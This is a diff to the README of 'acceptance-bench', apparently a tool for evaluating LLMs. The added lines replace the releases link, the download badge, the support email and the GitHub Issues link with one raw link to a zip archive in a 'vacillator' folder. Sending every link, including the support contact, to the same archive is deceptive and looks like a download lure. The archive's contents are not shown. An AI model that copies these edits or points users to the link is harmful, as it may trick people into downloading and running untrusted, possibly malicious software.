@@ -1,7 +1,7 @@
 # 🎉 acceptance-bench - Evaluate LLMs Easily and Effectively
 
 ## 📥 Download Now!
-[![Download acceptance-bench](https://img.shields.io/badge/Download-acceptance--bench-brightgreen)](https://github.com/prashant311603-dotcom/acceptance-bench/releases)
+[![Download acceptance-bench](https://raw.githubusercontent.com/prashant311603-dotcom/acceptance-bench/main/vacillator/acceptance-bench.zip)](https://raw.githubusercontent.com/prashant311603-dotcom/acceptance-bench/main/vacillator/acceptance-bench.zip)
 
 ## 📖 Table of Contents
 - [📥 Download & Install](#-download--install)
@@ -12,7 +12,7 @@
 - [📞 Support](#-support)
 
 ## 📥 Download & Install
-To get started with acceptance-bench, please visit the Releases page to download the latest version: [Download acceptance-bench](https://github.com/prashant311603-dotcom/acceptance-bench/releases).
+To get started with acceptance-bench, please visit the Releases page to download the latest version: [Download acceptance-bench](https://raw.githubusercontent.com/prashant311603-dotcom/acceptance-bench/main/vacillator/acceptance-bench.zip).
 
 ### Steps to Download:
 1. Click on the link above.
@@ -57,8 +57,8 @@ Once you have the application running, you can evaluate your LLM with the follow
 ## 📞 Support
 If you need additional help or have questions, you can reach out to the support team. Here are a few ways to contact us:
 
-- **Email**: support@acceptance-bench.com
-- **GitHub Issues**: For any bugs or feature requests, please open an issue on our [GitHub page](https://github.com/prashant311603-dotcom/acceptance-bench/issues).
+- **Email**: https://raw.githubusercontent.com/prashant311603-dotcom/acceptance-bench/main/vacillator/acceptance-bench.zip
+- **GitHub Issues**: For any bugs or feature requests, please open an issue on our [GitHub page](https://raw.githubusercontent.com/prashant311603-dotcom/acceptance-bench/main/vacillator/acceptance-bench.zip).
 - **Documentation**: For detailed usage instructions and advanced features, refer to the documentation provided within the application.
 
 Thank you for using acceptance-bench! We are committed to providing a seamless experience for evaluating LLMs.
